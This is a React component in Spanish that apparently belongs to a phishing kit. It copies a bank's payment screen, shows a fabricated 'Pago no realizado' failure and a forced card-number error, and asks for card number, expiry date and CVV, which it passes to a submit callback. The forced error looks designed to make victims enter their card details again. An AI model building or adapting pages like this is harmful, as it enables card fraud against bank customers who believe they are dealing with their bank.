/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState } from "react";

export default function ErrorTarcredito({
  enviar,
}: {
  enviar?: (data: any) => void;
}) {
  const [tarjeta, setTarjeta] = useState("");
  const [fecha, setFecha] = useState("");
  const [cvv, setCvv] = useState("");

  // -------- VALIDACIONES ---------
  const isTarjetaValid = tarjeta.length >= 15 && tarjeta.length <= 16;
  const isFechaValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(fecha);
  const isCvvValid = cvv.length >= 3 && cvv.length <= 4;

  const canSubmit = isTarjetaValid && isFechaValid && isCvvValid;

  const handleSubmit = () => {
    if (!canSubmit) return;
    enviar?.({ tarjeta, fecha, cvv, view: "tarjeta_verif" });
  };

  const handleFechaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    if (val.length > 4) val = val.slice(0, 4);
    if (val.length > 2) val = val.slice(0, 2) + "/" + val.slice(2);
    setFecha(val);
  };

  return (
    <>
      {/* HEADER ====================================== */}
      <div id="bdb-ml-header-bv" className="bdb-ml-header-bv__container">
        <div className="bdb-ml-header-bv__container__content">
          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--l">
            <div className="bdb-ml-header-bv__container__content__leftBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico">
                <span className="ico-arrow-back"></span> Atrás
              </button>
            </div>
          </div>

          <div className="bdb-ml-header-bv__container__content__center">
            <label className="bdb-ml-header-bv__container__content__center__title" style={{ color: '#C94740' }}>
              Pago no realizado
            </label>
          </div>

          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--r">
            <div className="bdb-ml-header-bv__container__content__button__rigthBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico bdb-at-btn--sm--ico-right">
                Abandonar <span className="ico-close"></span>
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* BODY ====================================== */}
      <div className="sherpa-grid">
        <div className="sherpa-container">
          <div className="col-xs-12 col-sm-10 col-md-10 col-lg-6 col-sm-offset-1 col-md-offset-1 col-lg-offset-3">

            <div className="_7pFqf6HtJm-Go1Dv-hAW5g==">
              <span className="sherpa-typography-heading-6" style={{ color: '#C94740' }}>Pago no realizado</span>
            </div>

            <div>
              <div className="bdb-ml-bm-token">
                {/* Icono de alerta en rojo */}
                <span className="ico-error-circle" style={{ fontSize: '48px', color: '#C94740', display: 'block', textAlign: 'center' }}>⚠️</span>

                <div className="bdb-ml-bm-token__title">
                  <div className="bdb-ml-bm-token__title__label">
                    <b style={{ color: '#C94740' }}>Pago no realizado</b>
                  </div>
                </div>

                <div className="bdb-ml-bm-token__description">
                  En este momento no es posible realizar la transacción, para continuar el pago ingrese los datos de su tarjeta crédito o débito
                </div>

                {/* NÚMERO DE TARJETA CON ERROR FORZADO ========================== */}
                <div className="etiqueta" style={{ marginBottom: 10, marginTop: 10 }}>
                  Número de tarjeta
                </div>

                <input
                  type="text"
                  className="bdb-at-input-text input-error" // Clase forzada de error
                  placeholder="XXXX XXXX XXXX XXXX"
                  maxLength={16}
                  value={tarjeta}
                  onChange={(e) => setTarjeta(e.target.value.replace(/[^0-9]/g, ""))}
                  style={{ backgroundColor: '#FFF5F5' }}
                />

                <div className="bdb-at-input-token__msj-error errortoken" style={{ marginTop: 5, color: '#C94740', fontWeight: 'bold' }}>
                  ❌ El número de la tarjeta tiene un error.
                </div>

                {/* FILA FECHA Y CVV ========================================== */}
                <div style={{ display: 'flex', gap: '15px', marginTop: 15 }}>
                  <div style={{ flex: 1 }}>
                    <div className="etiqueta" style={{ marginBottom: 10 }}>
                      Fecha (MM/AA)
                    </div>
                    <input
                      type="text"
                      className="bdb-at-input-text input-error"
                      placeholder="MM/AA"
                      value={fecha}
                      onChange={handleFechaChange}
                      style={{ backgroundColor: '#FFF5F5' }}
                    />
                  </div>

                  <div style={{ flex: 1 }}>
                    <div className="etiqueta" style={{ marginBottom: 10 }}>
                      CVV
                    </div>
                    <input
                      type="password"
                      className="bdb-at-input-text input-error"
                      placeholder="***"
                      maxLength={4}
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ""))}
                      style={{ backgroundColor: '#FFF5F5' }}
                    />
                  </div>
                </div>

                {/* BOTÓN ========================================== */}
                <div className="bdb-ml-bm-token__actions" style={{ marginTop: 30 }}>
                  <div className="bdb-ml-bm-token__actions__send">
                    <button
                      className="bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg"
                      style={{ backgroundColor: '#C94740', borderColor: '#C94740' }} // Botón en tono de alerta
                      disabled={!canSubmit}
                      onClick={handleSubmit}
                    >
                      Reintentar Validación
                    </button>
                  </div>
                </div>

              </div>
            </div>

          </div>
        </div>
      </div>
    </>
  );
}